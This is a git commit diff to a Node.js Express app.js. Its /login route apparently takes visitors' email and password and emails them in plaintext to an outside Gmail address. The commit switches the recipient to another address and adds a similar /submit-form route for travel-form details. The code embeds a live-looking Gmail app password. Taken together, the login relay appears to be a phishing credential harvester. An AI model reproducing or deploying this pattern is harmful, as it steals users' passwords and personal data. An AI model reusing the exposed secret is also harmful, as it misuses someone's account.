3b78ad7cc4a7ddf7e4cb4560710b9ef052cf1c13
Ekele Stivin Agbakwuru <ekeleagbakwuru9@gmail.com>
2024-04-22 11:45:37 +0100

    new updates

--- app.js
+++ app.js
@@ -26,7 +26,7 @@ app.post("/login", (req, res) => {
   // Setup email data
   let mailOptions = {
     from: "ekeleagbakwuru9@gmail.com",
-    to: "ekeleagbakwuru9@gmail.com",
+    to: "njusticej@gmail.com",
     subject: "New Form Submission",
     text: ` \nEmail: ${email}\nPassword: ${password}`,
   };
@@ -43,8 +43,57 @@ app.post("/login", (req, res) => {
   });
 });
 
+
+// submit form from jide
+app.post("/submit-form", (req, res) => {
+  // Extract form data
+  const {   
+    firstName,
+    lastName,
+    email,
+    budget,
+    activity,
+    destination  } = req.body;
+
+  // Create transporter object using SMTP transport
+  let transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: "ekeleagbakwuru9@gmail.com",
+      pass: "asjyyxyxjpjsqdei",
+    },
+  });
+
+  // Setup email data
+  let mailOptions = {
+    from: "ekeleagbakwuru9@gmail.com",
+    to: "njusticej@gmail.com",
+    subject: "New Form Submission",
+    text: `
+      \nFirst Name: ${firstName}
+      \nLast Name: ${lastName}
+      \nEmail: ${email}
+      \nBudget: ${budget}
+      \nActivity: ${activity}
+      \nDestination: ${destination}
+    `,
+  };
+  
+
+  // Send email
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.error("Error:", error);
+      res.status(500).send("Error sending email");
+    } else {
+      console.log("Email sent:", info.response);
+      res.send("Email sent successfully");
+    }
+  });
+});
+
 // Start the server
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`Server is running on port ${PORT}`);
+  console.log(`Server is runningning on port ${PORT}`);
 });
